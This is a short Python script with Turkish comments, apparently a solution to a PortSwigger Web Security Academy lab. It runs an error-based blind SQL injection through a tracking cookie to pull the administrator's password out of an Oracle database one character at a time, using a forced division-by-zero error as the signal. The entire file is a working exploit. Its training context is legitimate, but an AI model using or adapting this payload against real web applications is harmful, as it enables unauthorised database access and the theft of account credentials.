import requests


# bu kısm kendi seesion değerinizle değiştirmelisiniz
session="tg6rifZ7gYqEqAmQ5sQrsKU70LtHeYcE"
# bu kısm kendi TrackingId değerinizle değiştirmelisiniz
TrackingId="zODZfXUDAcQ99yHj"
# bu kısm kendi url değerinizle değiştirmelisiniz
url = 'https://0aaa00d7035de2ec80b3085e0088007a.web-security-academy.net/'

for i in range(1,21):
	
	for x in "qwertyuopasdfghjklizxcvbnm1234567890":
		payload = f"' AND (SELECT  CASE WHEN ((SELECT SUBSTR(password,{i},1) FROM users WHERE username = 'administrator')='{x}' ) THEN TO_CHAR(1/0) ELSE 'A' END FROM DUAL) = 'A"
		cookies = {
			"session" : session,
			"TrackingId" : TrackingId + payload
		}

		r = requests.get(url, cookies=cookies)
		if r.status_code == 500:
			print(f"{i}. karakter : {x}")
			break

